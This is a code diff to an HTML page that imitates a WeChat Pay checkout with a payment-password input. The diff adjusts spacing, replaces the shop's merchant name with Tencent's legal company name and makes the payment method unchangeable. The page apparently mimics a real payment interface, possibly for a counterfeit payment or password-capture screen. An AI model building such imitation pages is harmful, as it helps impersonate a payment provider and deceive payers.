@@ -170,6 +170,11 @@
             margin-bottom: 100px; /* 初始值 */
         }
         
+        /* 密码模式下减少支付方式区域的下边距 */
+        .payment-container.password-mode .payment-method-area {
+            margin-bottom: 20px;
+        }
+        
         .payment-method-left {
             display: flex;
             align-items: center;
@@ -418,7 +423,7 @@
             display: none;
             flex-direction: column;
             align-items: center;
-            margin-top: 0; /* 上移 */
+            margin-top: 0px; /* 上移20px */
         }
         
         .password-input-area.active {
@@ -429,7 +434,7 @@
             display: flex;
             justify-content: center;
             gap: 10px;
-            margin-bottom: 15px; /* 减少间距 */
+            margin-bottom: 10px; /* 减少间距 */
         }
         
         .password-input-box {
@@ -507,8 +512,8 @@
         <div class="payment-info">
             <div class="merchant-name-container">
                 <div class="warning-icon" id="warning-icon">!</div>
-                <div class="merchant-name" id="merchant-name">倍贝优家居小店</div>
-                <div class="payment-subtitle" id="payment-subtitle">订单已超过商家设置的最晚支付成功时间，请重新发起支付！</div>
+                <div class="merchant-name" id="merchant-name">深圳市腾讯计算机系统有限公司</div>
+                <div class="payment-subtitle" id="payment-subtitle">订单已超过商家设置的最晚支付成功时间，请再次下单，重新发起支付</div>
             </div>
             <div class="payment-amount">¥1.00</div>
             
@@ -571,7 +576,7 @@
         
         <!-- 支付处理状态 -->
         <div class="payment-processing" id="payment-processing">
-            <div class="merchant-name-top">倍贝优家居小店</div>
+            <div class="merchant-name-top">深圳市腾讯计算机系统有限公司</div>
             <div class="wechat-logo"></div>
             <div class="wechat-text">微信支付</div>
             <div class="loading-dots">
@@ -787,7 +792,7 @@
         // 更改链接点击事件
         document.querySelector('.change-link').addEventListener('click', function(e) {
             e.preventDefault();
-            alert('打开付款方式选择');
+            alert('默认付款方式，无法更改');
         });
     </script>
 </body>
